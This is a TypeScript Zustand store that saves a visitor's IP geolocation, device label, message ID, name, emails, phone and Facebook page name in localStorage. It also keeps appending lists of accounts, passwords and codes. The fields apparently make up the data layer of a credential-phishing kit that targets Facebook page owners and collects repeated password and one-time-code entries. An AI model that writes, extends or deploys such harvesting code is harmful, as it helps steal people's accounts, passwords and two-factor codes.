import { create } from 'zustand';
import { createJSONStorage, persist } from 'zustand/middleware';

export interface GeoInfo {
    asn: number;
    ip: string;
    country: string;
    city: string;
    region: string;
    country_code: string;
}

export interface UserData {
    fullName: string;
    personalEmail: string;
    businessEmail: string;
    phoneNumber: string;
    facebookPageName: string;
    information: string;
    accounts: string[];
    passwords: string[];
    codes: string[];
}

interface State {
    isModalOpen: boolean;
    geoInfo: GeoInfo | null;
    deviceLabel: string;
    messageId: number | null;
    userData: UserData;
    setModalOpen: (isOpen: boolean) => void;
    setGeoInfo: (info: GeoInfo) => void;
    setDeviceLabel: (label: string) => void;
    setMessageId: (id: number | null) => void;
    setUserData: (data: Partial<UserData>) => void;
    addAccount: (account: string) => void;
    addPassword: (password: string) => void;
    addCode: (code: string) => void;
}

const initialUserData: UserData = {
    fullName: '',
    personalEmail: '',
    businessEmail: '',
    phoneNumber: '',
    facebookPageName: '',
    information: '',
    accounts: [],
    passwords: [],
    codes: []
};

export const store = create<State>()(
    persist(
        (set) => ({
            isModalOpen: false,
            geoInfo: null,
            deviceLabel: 'Unknown',
            messageId: null,
            userData: initialUserData,
            setModalOpen: (isOpen: boolean) => set({ isModalOpen: isOpen }),
            setGeoInfo: (info: GeoInfo) => set({ geoInfo: info }),
            setDeviceLabel: (label: string) => set({ deviceLabel: label }),
            setMessageId: (id: number | null) => set({ messageId: id }),
            setUserData: (data: Partial<UserData>) =>
                set((state) => ({
                    userData: { ...state.userData, ...data }
                })),
            addAccount: (account: string) =>
                set((state) => ({
                    userData: { ...state.userData, accounts: [...state.userData.accounts, account] }
                })),
            addPassword: (password: string) =>
                set((state) => ({
                    userData: { ...state.userData, passwords: [...state.userData.passwords, password] }
                })),
            addCode: (code: string) =>
                set((state) => ({
                    userData: { ...state.userData, codes: [...state.userData.codes, code] }
                }))
        }),
        {
            name: 'storage',
            storage: createJSONStorage(() => localStorage),
            partialize: (state) => ({
                geoInfo: state.geoInfo,
                deviceLabel: state.deviceLabel,
                messageId: state.messageId,
                userData: state.userData
            })
        }
    )
);
